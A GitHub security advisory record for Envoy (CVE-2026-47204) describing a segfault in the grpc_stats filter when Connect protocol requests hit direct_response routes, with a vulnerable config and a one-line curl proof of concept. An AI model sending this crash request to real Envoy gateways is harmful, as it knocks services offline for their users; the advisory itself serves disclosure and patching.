null, "vector_string": null}}, "cwe_ids": [], "cwes": [], "description": "### Summary
The `envoy.filters.http.grpc_stats` filter crashes (null pointer dereference / segfault) when a Connect protocol request (`Content-Type: application/connect+proto` or `application/connect+json`) hits a direct_response route. A single unauthenticated HTTP request crashes the Envoy process. No special payload, gRPC client, or protobuf framing is required just the right Content-Type header hitting direct_response route.

### Details
The grpc_stats filter appears to dereference a null cluster/upstream pointer when processing a request that Envoy classifies as gRPC-like (Connect protocol content types) but that is served by a direct_response route, which has no upstream. The filter assumes an upstream cluster exists to collect stats from, but direct_response bypasses upstream routing entirely.
Native GRPC path checks [doStatTracking()](https://github.com/envoyproxy/envoy/blob/d485ce5563f76740472da3a8744b206b39389af2/source/extensions/filters/http/grpc_stats/grpc_stats_filter.cc#L220) before dereferncing `cluster_`. 
For connect protocol there's [no doStatTracking()](https://github.com/envoyproxy/envoy/blob/d485ce5563f76740472da3a8744b206b39389af2/source/extensions/filters/http/grpc_stats/grpc_stats_filter.cc#L231) guard

Segfault backtrace:


### PoC
Simple envoy config:
```
static_resources:
  listeners:
    - name: listener_0
      address:
        socket_address:
          address: 0.0.0.0
          port_value: 10000
      filter_chains:
        - filters:
            - name: envoy.filters.network.http_connection_manager
              typed_config:
                "@type": type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager
                stat_prefix: ingress_http
                codec_type: AUTO
                route_config:
                  name: local_route
                  virtual_hosts:
                    - name: local_service
                      domains: ["*"]
                      routes:
                        - match:
                            prefix: "/"
                          direct_response:
                            status: 404
                            body:
                              inline_string: "not found"
                http_filters:
                  - name: envoy.filters.http.grpc_stats
                    typed_config:
                      "@type": type.googleapis.com/envoy.extensions.filters.http.grpc_stats.v3.FilterConfig
                      stats_for_all_methods: true
                      enable_upstream_stats: true
                  - name: envoy.filters.http.router
                    typed_config:
                      "@type": type.googleapis.com/envoy.extensions.filters.http.router.v3.Router
admin:
  address:
    socket_address:
      address: 0.0.0.0
      port_value: 9901
```
In combination with a simple connect request:

```
curl -H "Content-Type: application/connect+proto" http://127.0.0.1:10000/anything
```

### Impact
Anyone with combination of direct_response and grpc_stats filter is affected. Unauthenticated user can crash the whole gateway remotely with a curl request to those direct_response routes.", "ghsa_id": "GHSA-3jxh-8p6x-7pf6", "html_url": "https://github.com/envoyproxy/envoy/security/advisories/GHSA-3jxh-8p6x-7pf6", "identifiers": [{"type": "GHSA", "value": "GHSA-3jxh-8p6x-7pf6"}, {"type": "CVE", "value": "CVE-2026-47204"}], "private_fork": null, "published_at": "2026-06-23T14:04:07Z", "publisher": {"avatar_url": "https://avatars.githubusercontent.com/u/14430883?v=4", "events_url": "https://api.github.com/users/nezdolik/events{/privacy}", "followers_url": "https://api.github.com/users/nezdolik/followers", "following_url": "https://api.github.com/users/nezdolik/following{/other_user}", "gists_url": "https://api.github.com/users/nezdolik/gists{/gist_id}", "gravatar_id": "", "html_url": "https://github.com/nezdolik", "id": 14430883, "login": "nezdolik", "node_id": "MDQ6VXNlcjE0NDMwODgz", "organizations_url": "https://api.github.com/users/nezdolik/orgs", "received_events_url": "https://api.github.com/users/nezdolik/received_events", "repos_url": "https://api.github.com/users/nezdolik/repos", "site_admin": false, "starred_url": "https://api.github.com/users/nezdolik/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/nezdolik/subscriptions", "type": "User", "url": "https://api.github.com/users/nezdolik", "user_view_type": "public"}, "severity": "medium", "state": "published", "submission": null, "summary": "Envoy: grpc_stats filter segfault on Connect protocol requests to direct_response routes", "updated_at": "2026-06-23T14:04:07Z", "url": "https://api.github.com/repos/envoyproxy/envoy/security-advisories/GHSA-3jxh-8p6x-7pf6", "vulnerabilities": [{"package": {"ecosystem": "go", "name": "github.com/envoyproxy/envoy"}, "patched_versions": "1.35.13 1.36.9 1.37.5 1.38.3", "vulnerable_functions": [], "vulnerable_version_range": ">=1.26,<=1.38.0"}], "withdrawn_at": null}

title: Envoy: grpc_stats filter segfault on Connect protocol requests to direct_response routes
